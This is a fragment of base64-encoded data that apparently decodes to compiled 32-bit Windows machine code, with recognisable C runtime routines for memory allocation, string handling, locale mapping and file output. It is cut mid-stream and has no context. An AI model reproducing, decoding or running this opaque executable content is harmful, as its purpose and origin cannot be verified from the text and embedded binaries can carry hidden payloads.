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BD4XoAAAAiV34OV0YdQiLB4tABIlFGIs1IAEBEDPAOV0gU1P/dRAPlcD/dQyNBMUBAAAAUP91GP/Wi/g7+w+EqwAAAH48gf/w//9/dzSNRD8IPQAEAAB3E+ihIwAAi8Q7w3QcxwDMzAAA6xFQ6Cf2//9ZO8N0CccA3d0AAIPACIvYhdt0aY0EP1BqAFPo3Z///4PEDFdT/3UQ/3UMagH/dRj/1oXAdBH/dRRQU/91CP8VLAEBEIlF+FPoyfr//4tF+FnrdTP2OV0cdQiLB4tAFIlFHDldGHUIiweLQASJRRj/dRzoDCEAAFmD+P91BDPA60c7RRh0HlNTjU0QUf91DFD/dRjoNCEAAIvwg8QYO/N03Il1DP91FP91EP91DP91CP91HP8VKAEBEIv4O/N0B1boqJ7//1mLx41l7F9eW4tN/DPN6CmW///Jw4v/VYvsg+wQ/3UIjU3w6DSY////dSSNTfD/dSD/dRz/dRj/dRT/dRD/dQzoFv7//4PEHIB9/AB0B4tN+INhcP3Jw4v/VYvsVot1CIX2D4SBAQAA/3YE6Die////dgjoMJ7///92DOgonv///3YQ6CCe////dhToGJ7///92GOgQnv///zboCZ7///92IOgBnv///3Yk6Pmd////dijo8Z3///92LOjpnf///3Yw6OGd////djTo2Z3///92HOjRnf///3Y46Mmd////djzowZ3//4PEQP92QOi2nf///3ZE6K6d////dkjopp3///92TOienf///3ZQ6Jad////dlTojp3///92WOiGnf///3Zc6H6d////dmDodp3///92ZOhunf///3Zo6Gad////dmzoXp3///92cOhWnf///3Z06E6d////dnjoRp3///92fOg+nf//g8RA/7aAAAAA6DCd////toQAAADoJZ3///+2iAAAAOganf///7aMAAAA6A+d////tpAAAADoBJ3///+2lAAAAOj5nP///7aYAAAA6O6c////tpwAAADo45z///+2oAAAAOjYnP///7akAAAA6M2c////tqgAAADowpz//4PELF5dw4v/VYvsVot1CIX2dDWLBjsFYFoBEHQHUOifnP//WYtGBDsFZFoBEHQHUOiNnP//WYt2CDs1aFoBEHQHVuh7nP//WV5dw4v/VYvsVot1CIX2dH6LRgw7BWxaARB0B1DoWZz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CibVA5f//iY0g5f//PAF0BDwCdVL/tUDl///oQxsAAFlmO4VA5f//D4VoAwAAg4U45f//AoO9IOX//wB0KWoNWFCJhUDl///oFhsAAFlmO4VA5f//D4U7AwAA/4U45f///4Uw5f//i0UQOYVE5f//D4L5/f//6ScDAACLDooT/4U45f//iFQPNIsOiUQPOOkOAwAAM8mLBgPH9kAEgA+EvwIAAIuFNOX//4mNQOX//4TbD4XKAAAAiYU85f//OU0QD4YgAwAA6waLtSjl//+LjTzl//+DpUTl//8AK4005f//jYVI5f//O00QczmLlTzl////hTzl//+KEkGA+gp1EP+FMOX//8YADUD/hUTl//+IEED/hUTl//+BvUTl////EwAAcsKL2I2FSOX//yvYagCNhSzl//9QU42FSOX//1CLBv80B/8VOAEBEIXAD4RCAgAAi4Us5f//AYU45f//O8MPjDoCAACLhTzl//8rhTTl//87RRAPgkz////pIAIAAImFROX//4D7Ag+F0QAAADlNEA+GTQIAAOsGi7Uo5f//i41E5f//g6U85f//ACuNNOX//42FSOX//ztNEHNGi5VE5f//g4VE5f//Ag+3EkFBZoP6CnUWg4Uw5f//AmoNW2aJGEBAg4U85f//AoOFPOX//wJmiRBAQIG9POX///4TAABytYvYjYVI5f//K9hqAI2FLOX//1BTjYVI5f//UIsG/zQH/xU4AQEQhcAPhGIBAACLhSzl//8BhTjl//87ww+MWgEAAIuFROX//yuFNOX//ztFEA+CP////+lAAQAAOU0QD4Z8AQAAi41E5f//g6U85f//ACuNNOX//2oCjYVI+f//XjtNEHM8i5VE5f//D7cSAbVE5f//A85mg/oKdQ5qDVtmiRgDxgG1POX//wG1POX//2aJEAPGgb085f//qAYAAHK/M/ZWVmhVDQAAjY3w6///UY2NSPn//yvBmSvC0fhQi8FQVmjp/QAA/xXcAAEQi9g73g+ElwAAAGoAjYUs5f//UIvDK8ZQjYQ18Ov//1CLhSjl//+LAP80B/8VOAEBEIXAdAwDtSzl//873n/L6wz/FRwAARCJhUDl//873n9ci4VE5f//K4U05f//iYU45f//O0UQD4IK////6z9qAI2NLOX//1H/dRD/tTTl////MP8VOAEBEIXAdBWLhSz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